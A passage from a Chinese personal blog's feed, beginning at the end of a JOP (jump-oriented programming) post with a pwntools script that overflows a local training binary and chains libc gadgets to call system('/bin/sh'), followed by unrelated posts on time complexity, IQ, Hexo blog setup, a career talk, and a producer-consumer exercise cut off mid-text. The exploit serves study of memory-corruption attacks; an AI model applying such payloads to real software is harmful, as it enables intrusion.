class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./JOP'</span>)</span><br><span class="line"></span><br><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">pop_jmp_addr = <span class="number">0x0000000000104052</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里的pop_ret_addr和pop_jmp_addr需要做一下物理地址的计算，因为我们已经知道了system()的物理地址，而我们利用的gadget和system都在libc.so.6中，所以我们用libc.symbols[‘system’]得到system()的逻辑地址，并进行gadget和其偏移量的计算，最后算出pop_ret_addr和pop_jmp_addr的物理地址。</p><p>攻击效果：</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93r0j441j30nj06nq3m.jpg" alt=""></p><p>（本人攻击时的文件名均为ROP，读者将其改为JOP即可）</p><p>参考：</p><p><a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.78e74d82WcwIGi&amp;articleid=403" target="_blank" rel="noopener">http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.78e74d82WcwIGi&amp;articleid=403</a></p><p><a href="https://blog.csdn.net/alimobilesecurity/article/details/53067274" target="_blank" rel="noopener">https://blog.csdn.net/alimobilesecurity/article/details/53067274</a></p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JOP攻击&quot;&gt;&lt;a href=&quot;#JOP攻击&quot; class=&quot;headerlink&quot; title=&quot;JOP攻击&quot;&gt;&lt;/a&gt;JOP攻击&lt;/h1&gt;&lt;h2 id=&quot;一、JOP&quot;&gt;&lt;a href=&quot;#一、JOP&quot; class=&quot;headerlink&quot; title=&quot;一、J
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于时间复杂度</title>
    <link href="http://yoursite.com/2018/02/11/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6--18.2.13/"/>
    <id>http://yoursite.com/2018/02/11/时间复杂度--18.2.13/</id>
    <published>2018-02-11T10:34:28.000Z</published>
    <updated>2018-02-21T02:44:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个好的算法应该具备时间效率高且要求存储量低的特点。这里只记录时间效率的衡量的方式。今年12月份-明年1月份左右就要考研了。这里记录的大部分可能针对考研中的算法时间复杂度分析。</p><a id="more"></a><p>对于时间复杂度的分析，我们只要牢记一句话，就能把定义搞明白：将算法中基本操作的执行次数作为算法时间复杂度的度量。这里讨论的时间复杂度不是执行完一段程序的总时间，而是其执行基本操作的总次数。所以时间复杂度指的是次数值，而不是一个时间长度。而这里的基本操作，在我目前的知识水平理解来，可以包括赋值、运算（加减乘除等等）、函数调用等等。因此，对一个算法进行时间复杂度分析的要点，无非是明确算法中哪些操作是基本操作，然后计算出基本操作重复执行的次数即可。在一个算法中，总能找到一个n，可以称为问题的规模，如果要处理的数组元素的个数为n，那么基本操作所执行的次数是n的一个函数f(n)（这里的函数是数学函数的概念，不是编程语言中的函数的概念）。对于求其基本操作执行的次数，就是求函数f(n)。求出以后就可以取出f(n)中随n增大而增长最快的项，然后将其系数变为1，作为时间复杂度的度量，记为T(n) = O(f(n)中增长最快的项/此项的系数)。例如，f(n) = 2n^3 + 4n^2 + 100，则其时间复杂度为T(n) = O(2n^3/2) = O(n^3)。实际上计算算法的时间复杂度就是给出相应的数量级，当f(n)与n无关时，时间复杂度为T(n) = O(1)；当f(n)与n是线性关系时，T(n) = O(n)；当f(n)与n是平方关系时，T(n) = O(n^2)；以此类推。</p><p>总结一下，求一个算法的时间复杂度可以分为以下几个步骤：</p><p>1、明确算法的问题规模，明确算法中的基本操作。</p><p>2、基于算法的问题规模计算算法中执行基本操作的次数，即计算f(n)。</p><p>3、找出f(n)中增长最快的项，除以系数，即可求出T(n) = O(n)。</p><p>注意：有的算法中基本操作的执行次数不仅跟初始输入的数据规模有关， 还和数据本身有关。例如，一些排序算法，同样有n个待处理数据，但数据初始有序性不同，则基本操作的执行次数也不同。因此排序算法中时间复杂度分为最佳情况、平均情况和最差情况。因此一般依照使得基本操作执行次数最多的输入来计算时间复杂度，即将最坏的情况作为算法时间复杂度的度量。</p><p><strong>常见的时间复杂度有：</strong></p><p>常数阶O(1) &lt; 对数阶O(log2n) &lt; 线性阶O(n) &lt;线性对数阶O(nlog2n) &lt; 平方阶O(n^2) &lt; 方阶O(n^3) &lt; k次方阶O(n^k) &lt; 指数阶O(2^n) &lt; O(n!) &lt; O(n^n)</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1focvsw2z8yj30go0a8wid.jpg" alt=""></p><h3 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h3><p>求出以下算法的时间复杂度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">fun</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; n)&#123;</span><br><span class="line">        j++;</span><br><span class="line">        i+=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第一步：找出基本操作，确定规模n。"><a href="#第一步：找出基本操作，确定规模n。" class="headerlink" title="第一步：找出基本操作，确定规模n。"></a>第一步：找出基本操作，确定规模n。</h5><p>1）找出基本操作。基本操作即以求时间复杂度为目的的前提下，重复执行次数和算法的执行时间成正比的操作。通俗的说，这种操作组成了算法，当它们都执行完的时候算法也结束了，多数情况下取最深层循环内的语句所描述的操作为基本操作，显然本例中j++与i+=2这两行都可以作为基本操作。</p><p>2）确定规模。由循环条件i &lt; n可知，循环执行的次数（基本操作执行的次数）和参数n有关，因此参数n就是我们所说的规模n。</p><h5 id="第二步：计算出n的函数f-n-。"><a href="#第二步：计算出n的函数f-n-。" class="headerlink" title="第二步：计算出n的函数f(n)。"></a>第二步：计算出n的函数f(n)。</h5><p>显然，n确定以后，循环的结束与否和i有关。i的初值为1，每次自增2，假设i自增m次后循环结束，则i最后的值为1 + 2m，因此有1 + 2m + K = n（其中K为一个常数，因为在循环结束时i的值稍大于n，为了方便表述和进一步计算，用K将1 + 2m修正成n，因为K为常数，所以这样做不会影响最终时间复杂度的计算），解得m = (n - 1 - K)/2，即f(n) = (n - 1 - K)/2，可以发现其中增长最快的项为n/2，因此时间复杂度T(n) = O(n)。</p><h3 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h3><p>分析一下算法的时间复杂度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">            x++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>x++处于最内层循环，因此取x++作为基本操作。显然n为规模，可以算出x++的执行次数为f(n) = n * (n - 1) / 2，变化最快的项为n^2/2，因此时间复杂度为T(n) = O(n^2)。</p><h3 id="例子3："><a href="#例子3：" class="headerlink" title="例子3："></a>例子3：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(s &lt; n)&#123;</span><br><span class="line">        i++;</span><br><span class="line">        s += i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>显然规模为n，基本操作为i++和s += i，i与s都从零开始，假设循环执行m次结束，则有s1 = 1，s2 = 1 + 2 = 3，s3 = 1 + 2 + 3 = 6，……，sm = m(m + 1)/2（其中sm为执行到第m次的时候s的值），则有m(m + 1)/2 + K = n（K为起修正作用的常数），由求根公式得，m = [-1 + 根号下(8n + 1 - 8K) ]/2，即f(n) = [-1 + 根号下(8n + 1 - 8K) ]/2。因此时间复杂度为T(n) = O(根号n)。</p><h3 id="三条总结："><a href="#三条总结：" class="headerlink" title="三条总结："></a>三条总结：</h3><p>1、取决于执行次数最多的语句，如当有若干个循环语句时，算法的时间复杂度是由嵌套层数最多的循环语句中最内层语句的频度f(n)决定的。</p><p>2、如果算法的执行时间不随着问题规模n的增加而增长，即使算法中有上千条语句，其执行时间也不过是一个较大的常数。此类算法的时间复杂度是O(1)</p><p>3、算法的时间复杂度不仅仅依赖于问题的规模，还与输入实例的初始状态有关。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个好的算法应该具备时间效率高且要求存储量低的特点。这里只记录时间效率的衡量的方式。今年12月份-明年1月份左右就要考研了。这里记录的大部分可能针对考研中的算法时间复杂度分析。&lt;/p&gt;
    
    </summary>
    
    
      <category term="algorithm" scheme="http://yoursite.com/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>人之间IQ到底有没有差距</title>
    <link href="http://yoursite.com/2018/02/11/%E5%85%B3%E4%BA%8E%E6%99%BA%E5%95%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95--18.2.13/"/>
    <id>http://yoursite.com/2018/02/11/关于智商的一些看法--18.2.13/</id>
    <published>2018-02-11T09:13:24.000Z</published>
    <updated>2018-02-21T02:43:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>偶然在知乎上看到了一个关于人和人之间智商是不是真的有差别的题，有一位小哥的回答如下：</p><a id="more"></a><p>我就是那个坚持说人与人的智商没有什么差别的人。因为我不知道什么是智商，如果智商指的是解决问题的能力的话，我发现这个受很多因素的影响。</p><p>1：受环境因素的影响，比如一个人的父母都是机械工程师，家里的玩具，平时接触到的很多东西都是机械。（当然这个的父母要是正常热爱机械的人，这样才更有可能影响到这个人）那么这个人可能在机械上会更有领悟力，更有所谓的天赋。</p><p>2：受情绪的影响。如果一个人对有些东西或观念过于执着。通常这会影响到的他的变通能力，同时就影响到他解决问题的能力。因为他会把这些观念变成一个无法改变的前提，而这些无法改变的前提通常就是需要解决的问题所在。</p><p>3：受性格的影响。有时候一个人习惯了求助别人的人，他碰到的第一反应会是去求助别人，而不是自己去解决问题。可是你不能就否认他没有解决问题的能力。</p><p>4：另外一个问题：解决问题的能力他是一个渐进性的成长。你说一个人聪明，智商高是因为他解决问题的成功率高，可是我敢断言他也会有一筹莫展的时候，因为那些巨牛的物理学家也会陷入困境。可是我们人不知道为什么老是希望神话他们，老是忽略他们在为提高个人解决能力而付出的努力。他们接触问题的能力渐进的原因是在于他们把每一次困顿，挫折都变成他们向上的阶梯。</p><p>我个人的对智商的看法是：智商是一个复杂的系统，他不是单纯的简单的一个1加1等于2的逻辑。他是一个你愿意抛弃放弃自我的成见，付出你的生命，你所有的爱来拥抱世界，拥抱真理的勇气。有时候我甚至自己都有点迷糊，我到底是在描述智商还是在描述宗教。有时候我甚至怀疑智商某种程度上就是一种爱，你过于爱一个东西进而陷入到一种无我的专注，而在这种忘我的专注中你获得幸福，一种尘世中无法得到的幸福，而我们大部分人甚至无法想象这种幸福，只能仰慕，并自我安慰的说：他们之所以这么牛逼是因为他们智商比我们高。可是那些牛逼的人却不知道怎么作答。因为他知道即使告诉他们真相，他们还是不会去接受。真相永远都是需要自我去发现的。</p><p>我看完这个小哥写的这一篇回答之后感触颇深。我是一直认为人和人之间的智商是有很大差别的，到现在我也这样认为。有些人学习新事物就是很快，比如你花了一天时间去理解计算机数据结构中的链表时，有些人就在上课的时候听的明明白白，下课就能很熟练的利用一种编程语言将其实现成一个类，功能齐全，接口简单，而这个时候你还处于理解的状态。但是反过来一想，你上课用了100%的精神去理解了吗，下课后用了100%的精神去实现了吗。答案显然是没有的。这就是上面这个小哥说的这个问题，是不是真的用你所有的爱来拥抱世界，拥抱真理。</p><p>很多人的一生都没有去从事他100%喜欢的工作。因此用所有的爱来拥抱世界就显得非常困难了。但是，我感觉人这一辈子，只要有一个不服输，不甘于落后的精神就可以了。要是说必须在所从事方面有很大的建树，只要坚持你的初心，在任何时候不放弃希望，等自己夕阳西下时回头一看，你这辈子，还真的是挺牛逼啊。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;偶然在知乎上看到了一个关于人和人之间智商是不是真的有差别的题，有一位小哥的回答如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="Life" scheme="http://yoursite.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>myclass_logo</title>
    <link href="http://yoursite.com/2018/02/10/%E7%8F%AD%E5%BE%BDlogo-18.2.13/"/>
    <id>http://yoursite.com/2018/02/10/班徽logo-18.2.13/</id>
    <published>2018-02-10T09:23:22.000Z</published>
    <updated>2018-02-21T02:19:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>大学班级的班徽</p><a id="more"></a><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fobh66yq3dj30en0dz47o.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大学班级的班徽&lt;/p&gt;
    
    </summary>
    
    
      <category term="Life" scheme="http://yoursite.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>基于github &amp;&amp; hexo网站搭建记录</title>
    <link href="http://yoursite.com/2018/02/10/%E5%9F%BA%E4%BA%8EHexo%E4%B8%8Egithub%E7%9A%84%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95--18.2.10/"/>
    <id>http://yoursite.com/2018/02/10/基于Hexo与github的网站建设记录--18.2.10/</id>
    <published>2018-02-10T07:46:26.000Z</published>
    <updated>2018-02-21T02:20:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>感谢github这个开源平台能够为我们提供如此服务，我真的是被其开源思想深深吸引。人类计算机事业的发展少不了github的贡献。本网站也是基于github &amp;&amp; hexo搭建的。下面记录搭建过程，以便后续翻看。</p><a id="more"></a><h3 id="一、建站前的准备"><a href="#一、建站前的准备" class="headerlink" title="一、建站前的准备"></a>一、建站前的准备</h3><p>终端操作系统：Mac OS Sierra</p><p>博客搭建平台：Hexo</p><p>托管平台：github，并且拥有一个账号</p><p>我使用的操作系统是苹果的OS Sierra，和OS X差不多。由于其是一个类unix操作系统，因此很多地方和linux很像。也由于我的苹果电脑便携，因此windows下利用git bash等等工具搭建的过程目前还不是很清楚。预见到自己以后很长时间也会使用苹果的操作系统。</p><h3 id="二、操作系统配置"><a href="#二、操作系统配置" class="headerlink" title="二、操作系统配置"></a>二、操作系统配置</h3><h4 id="1、安装homebrew"><a href="#1、安装homebrew" class="headerlink" title="1、安装homebrew"></a>1、安装homebrew</h4><p>Homebrew是针对Mac os终端设计的软件包管理工具，拥有安装、卸载、更新、查看、搜索等很多实用的功能。简单的一条指令，就可以实现包管理，而不用你关心各种依赖和文件路径的情况，十分方便快捷。要求电脑上必须安装Xcode命令行工具。下载命令百度去其官网查看即可。</p><h4 id="2、安装git-amp-amp-node-js-amp-amp-npm"><a href="#2、安装git-amp-amp-node-js-amp-amp-npm" class="headerlink" title="2、安装git &amp;&amp; node.js &amp;&amp; npm"></a>2、安装git &amp;&amp; node.js &amp;&amp; npm</h4><p>安装git：<code>brew install git</code></p><p>Node.js 和 npm的安装可以参见hexo官网：<a href="https://hexo.io" target="_blank" rel="noopener">https://hexo.io</a></p><p>但建议Node.js去其官网安装，版本较新。</p><p>这里注意node.js和npm只要安装一遍就好了，如果安装多了不同的版本，每次打开终端时都会提示有版本冲突。如果出现这种情况需要删除配置以后再安装，很麻烦。</p><h3 id="三、在github上创建仓库"><a href="#三、在github上创建仓库" class="headerlink" title="三、在github上创建仓库"></a>三、在github上创建仓库</h3><p>新建一个名为<code>你的用户名.github.io</code>的仓库，比如说，如果你的github用户名是test，那么你就新建<code>test.github.io</code>的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <code>http://test.github.io/</code>了，非常方便</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。创建成功后，默认会在你这个仓库里生成一些示例页面，以后的网站所有代码都是放在这个仓库里。</p><h3 id="四、绑定域名"><a href="#四、绑定域名" class="headerlink" title="四、绑定域名"></a>四、绑定域名</h3><p>当然，不绑定域名肯定也是可以的，就用默认的 <code>xxx.github.io</code> 来访问，如果你想更个性一点，想拥有一个属于自己的域名，那也是OK的。</p><p>本网站的域名是在阿里的万网上购买，20元一年。abigale的意思是“最初的快乐”。后缀就无所谓了，com肯定非常贵。</p><p>绑定域名分2种情况：带www和不带www的。</p><p>域名配置最常见有2种方式，CNAME和A记录，CNAME填写域名，A记录填写IP。到你的域名DNS设置页，将A记录指向github的IP，将CNAME指向<code>你的用户名.github.io</code>，这样可以保证无论是否添加www都可以访问。如下图</p><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fobf4ahpqgj30qw066wfe.jpg" alt=""></p><p>然后到你的github项目根目录新建一个名为CNAME的文件（无后缀），里面填写你的域名，加不加www都可以。</p><h3 id="五、配置SSH-key"><a href="#五、配置SSH-key" class="headerlink" title="五、配置SSH key"></a>五、配置SSH key</h3><p>配置ssh key的目的就是将你的终端电脑作为一台可信设备能够与github上的服务器进行通信。</p><p>可以直接在终端里面敲命令</p><p><code>.ssh</code> 这样就直接进入了ssh配置文件夹。如果出现错误说明是第一次使用ssh。</p><p>然后敲命令</p><p><code>ssh-keygen -t rsa -C &quot;邮件地址&quot;</code>邮箱地址为注册github的邮箱地址。</p><p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容，打开github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p>进行测试</p><p><code>ssh -T git@github.com # 注意邮箱地址不用改</code></p><p>有提示输入yes，然后如果看到提示</p><p>Hi xxxxxx! You’ve successfully authenticated, but GitHub does not provide shell access.</p><p>则说明配置成功了。后面还需要敲两行命令</p><p><code>git config --global user.name &quot;xxx&quot;// 你的github用户名，非昵称</code><br><code>git config --global user.email  &quot;xxx@qq.com&quot;// 填写你的github注册邮箱</code></p><h3 id="六、使用hexo搭建博客"><a href="#六、使用hexo搭建博客" class="headerlink" title="六、使用hexo搭建博客"></a>六、使用hexo搭建博客</h3><p>Hexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。</p><p>由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。</p><p>安装过程详见hexo官网。</p><p>安装好后就可以创建一个hexo博客工作站</p><p>在终端敲命令：</p><p><code>hexo init 文件夹名</code></p><p>以后所有的hexo工作都在此文件夹中进行。</p><p>有一项注意的：在我的电脑上每次打开终端都需要先敲命令</p><p><code>nvm install stable</code></p><p>才能使用hexo，这个可能是需要重新下载nvm的稳定版。</p><p>然后将当前路径定位到你的博客工作站，会发现有如下文件：</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fobfj1kftvj309s02hglu.jpg" alt=""></p><p>然后再敲hexo g 和hexo s，通过浏览器访问localhost:4000，就可以看到本地预览服务的网站了。</p><p>在工作站根目录下的_config.yml里面可以修改配置信息，如主题、网站标题以及上传仓库等等。</p><p>有关上传到github的配置部分如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>并且安装插件：<code>npm install hexo-deployer-git --save</code>，且每次上传之前都要安装此插件，具体为什么我也不知道。</p><p>然后hexo d就可以了。每次写文章要在source/_post目录下写就可以了。</p><p>常见命令：</p><p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #部署到GitHub<br>hexo help  # 查看帮助<br>hexo version  #查看Hexo的版本</p><p>还需要在source文件夹下建立一个无后缀名的CNAME保存域名，不然每次上传都会让之前的域名文件覆盖掉。也可加上一个README.md。</p><h3 id="七、致谢"><a href="#七、致谢" class="headerlink" title="七、致谢"></a>七、致谢</h3><p>感谢hexo以及github ，还有设计本主题的作者，网站底部有其作者网站链接。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感谢github这个开源平台能够为我们提供如此服务，我真的是被其开源思想深深吸引。人类计算机事业的发展少不了github的贡献。本网站也是基于github &amp;amp;&amp;amp; hexo搭建的。下面记录搭建过程，以便后续翻看。&lt;/p&gt;
    
    </summary>
    
    
      <category term="record" scheme="http://yoursite.com/tags/record/"/>
    
  </entry>
  
  <entry>
    <title>一次分享会的感受</title>
    <link href="http://yoursite.com/2018/02/09/%E5%8C%97%E4%BA%AC%E6%88%B7%E5%8F%A3%E5%AD%A6%E5%A7%90%E5%88%86%E4%BA%AB%E4%BC%9A%E6%84%9F%E5%8F%97--18.2.13/"/>
    <id>http://yoursite.com/2018/02/09/北京户口学姐分享会感受--18.2.13/</id>
    <published>2018-02-09T02:40:18.000Z</published>
    <updated>2018-02-21T02:20:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前有幸听了一位进入国企，拿到北京户口并且当前年薪25W左右的隔壁大学的学姐的分享，感触颇深。</p><a id="more"></a><h4 id="一、成绩还真的很重要"><a href="#一、成绩还真的很重要" class="headerlink" title="一、成绩还真的很重要"></a>一、成绩还真的很重要</h4><p>上大学之后自己并没有那么重视成绩。很过国企还是很看重成绩的，要有个学习的态度。现在为实已晚，就不要纠结太多，把后面的课程学好，努力努力再努力的准备考研吧。</p><h4 id="二、多维发展"><a href="#二、多维发展" class="headerlink" title="二、多维发展"></a>二、多维发展</h4><p>不要设限于单点，只拼技术，只拼成绩。只做学生工作都有点偏。但只要每一步都认真踏实地走，没有一步会走亏的，一定会在某一天，突然间就帮到你了，一定会的，功不唐捐。</p><h4 id="三、多去实践"><a href="#三、多去实践" class="headerlink" title="三、多去实践"></a>三、多去实践</h4><p>由于自己也不是特别积极的人，两年半了也没主动去找过老师做项目。现在想但做发现自己要准备考研了。说实话这前两年，我没有上成自己的大学，而只是上成了学校的大学。不要为满足学校、比赛的要求而学习。是要带有自己的目标去，做成我的项目，打成我的比赛，上成我的大学，而不是我们的。</p><h4 id="四、做学生工作、当小官很有用"><a href="#四、做学生工作、当小官很有用" class="headerlink" title="四、做学生工作、当小官很有用"></a>四、做学生工作、当小官很有用</h4><p>估计自己要做4年的班长了，不后悔，也从来没有后悔过。这是我大学中最值得骄傲的事情。为大家也好，为自己也好。也所谓“结交皆老苍，脱略小时辈”。多和长辈交流，资源丰富，思想超前。</p><h4 id="五、放宽视野和思维，主动开拓人生多种可能性"><a href="#五、放宽视野和思维，主动开拓人生多种可能性" class="headerlink" title="五、放宽视野和思维，主动开拓人生多种可能性"></a>五、放宽视野和思维，主动开拓人生多种可能性</h4><p>从山顶看，上山的路有无数条，但爬山的人，只有一条路可走，那就是走到山顶的路。所谓成事业者，非超世之才，唯坚韧不拔之志。许多人的大学就像跟团旅游，各个景点都被导游领着看到了。但然并卵。如果能自备背包，勇敢探索，整成个自助游，必要时找人帮忙，或别有洞天奇景。</p><p>加油吧！zhs！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前有幸听了一位进入国企，拿到北京户口并且当前年薪25W左右的隔壁大学的学姐的分享，感触颇深。&lt;/p&gt;
    
    </summary>
    
    
      <category term="feeling" scheme="http://yoursite.com/tags/feeling/"/>
    
  </entry>
  
  <entry>
    <title>My name_logo</title>
    <link href="http://yoursite.com/2018/01/26/%E5%90%8D%E5%AD%97logo--18.1.26/"/>
    <id>http://yoursite.com/2018/01/26/名字logo--18.1.26/</id>
    <published>2018-01-26T02:27:33.000Z</published>
    <updated>2018-02-21T02:20:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fnuco4crrlg30dw05lwfw.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux下利用信号量函数和共享内存函数和C语言实现生产者消费者问题</title>
    <link href="http://yoursite.com/2018/01/24/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98--18.1.25/"/>
    <id>http://yoursite.com/2018/01/24/生产者消费者问题--18.1.25/</id>
    <published>2018-01-24T12:21:27.000Z</published>
    <updated>2018-02-21T02:20:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>此问题是操作系统中的一个经典的同步异步问题，是我们操作系统课程中非常重要的一部分。实验要求我们用C语言在Linux操作系统下利用信号量函数和共享内存函数实现经典的生产者消费者问题。也借此把所学知识记录下来。实验要求如下：</p><a id="more"></a><p>在Linux操作系统下用C实现经典同步问题:生产者—消费者，具体要求如下: </p><p>（1）一个大小为10的缓冲区，初始状态为空。</p><p>（2）2个生产者，随机等待一段时间，往缓冲区中添加数据，若缓冲区已满，等待消费者取走数据之后再添加，重复10次。</p><p>（3）2个生产者，随机等待一段时间，往缓冲区中读取数据，若缓冲区为空，等待生产者添加数据之后再读取，重复10次。</p><p>（4）当前只能有一个进程对这个缓冲区进行操作 。</p><p>（5）缓冲区采用循环队列表示，利用头、尾指针来存放、读取数据，以及判断队列是否为空。缓冲区中数组大小为10。</p><p>（6）利用随机函数rand()得到A~Z的一个随机字符，作为生产者每次生产的数据，存放到缓冲区中。</p><p>（7）使用shmget()系统调用实现共享主存段的创建，shmget()返回共享内存区的ID。对于已经申请到的共享段，进程需把它附加到自己的虚拟空间中才能对其进行读写。</p><p>（8）信号量的建立采用semget()函数，同时建立信号量的 数量。在信号量建立后，调用semctl()对信号量进行初始2化 ，例如本实验中，可以建立两个信号量SEM_EMPTY、 SEM_FULL，初始化时设置SEM_EMPTY为10，SEM_FULL 为0。使用操 作信号的函数semop()做排除式操作，使用这个 函数防止对共享内存的同时操作。对共享内存操作完毕后采用shmctl()函数撤销共享内存段。</p><p>（9）使用循环，创建2个生产者以及2个消费者，采用函数 fork()创建一个新的进程。</p><p>（10）一个进程的一次操作完成后，采用函数fflush()刷新缓冲区。</p><p>（11）程序最后使用semctl()函数释放内存。</p><h3 id="二、生产者消费者问题"><a href="#二、生产者消费者问题" class="headerlink" title="二、生产者消费者问题"></a>二、生产者消费者问题</h3><p>生产者和消费者问题是多个相互合作的进程之间的一种抽象。生产者和消费者之间的关系:</p><ol><li>对缓冲区的访问是互斥的。由于两者都会修改缓冲区，因此，一方修改缓冲区时，另一方不能修改，这就是互斥。</li><li>一方的行为影响另一方。缓冲区不空，才能消费，何时不空？生产了就不空；缓冲区满，就不能生产，何时不满？消费了就不满。这是同步关系。</li></ol><p>为了描述这种关系，一方面，使用共享内存代表缓冲区；另一方面，使用互斥信号量 控制对缓冲区的访问，使用同步信号量描述两者的依赖关系。</p><h3 id="三、信号量"><a href="#三、信号量" class="headerlink" title="三、信号量"></a>三、信号量</h3><p>抽象的来讲，信号量（signal)的特性如下：信号量是一个非负整数，所有通过它的<a 